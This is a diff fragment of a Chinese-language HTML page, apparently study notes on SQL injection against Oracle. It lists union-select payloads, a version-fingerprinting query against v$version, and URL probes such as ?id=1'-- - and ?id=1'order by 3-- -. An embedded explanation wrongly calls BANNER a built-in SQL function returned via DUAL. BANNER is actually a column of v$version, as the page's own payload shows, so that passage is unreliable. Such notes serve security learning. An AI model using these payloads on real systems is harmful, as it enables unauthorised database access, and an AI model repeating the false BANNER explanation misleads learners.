+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union+select+&#x27;abc&#x27;,+&#x27;def&#x27;+from+xxxx</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT+BANNER,+NULL+FROM+v$version;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231228160645883.png" alt="image-20231228160645883"></p>
+<p>Oracle没有数据库名的概念，所谓数据库名，即数据表的拥有者，也就是用户名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">BANNER在Oracle数据库中是一条内置的SQL函数,它的功能是返回Oracle版本信息。</span><br><span class="line"></span><br><span class="line">具体来说:</span><br><span class="line"></span><br><span class="line">- BANNER是Oracle数据库提供的内置函数之一。</span><br><span class="line">- 当调用SELECT BANNER FROM DUAL时,它会返回Oracle数据库的版本信息。</span><br><span class="line">- 返回信息包含Oracle版本号、编译日期等详细信息。</span><br><span class="line">- 例如对于Oracle 11g,它可能返回:</span><br><span class="line"></span><br><span class="line">Oracle Database 11g Enterprise Edition Release 11.2.0.4.0 - 64bit Production</span><br><span class="line"> PL/SQL Release 11.2.0.4.0 - Production</span><br><span class="line"> &quot;CORE   11.2.0.4.0  Production&quot;</span><br><span class="line"> TNS for Linux: Version 11.2.0.4.0 - Production</span><br><span class="line"> NLSRTL Version 11.2.0.4.0 - Production</span><br><span class="line"></span><br><span class="line">- 通过BANNER可以快速获取Oracle数据库的详细版本信息。</span><br><span class="line">- 这对数据库管理和应用开发都很有帮助。</span><br><span class="line"></span><br><span class="line">所以总结来说,BANNER是Oracle内置函数,用于返回数据库版本的详细Banner信息,是常用的Oracle信息获取函数之一。</span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="重要语句"><a href="#重要语句" class="headerlink" title="重要语句"></a>重要语句</h2><p>?id&#x3D;1</p>
 <p>?id&#x3D;1’– -</p>
 <p>?id&#x3D;1’order by 3– -</p>
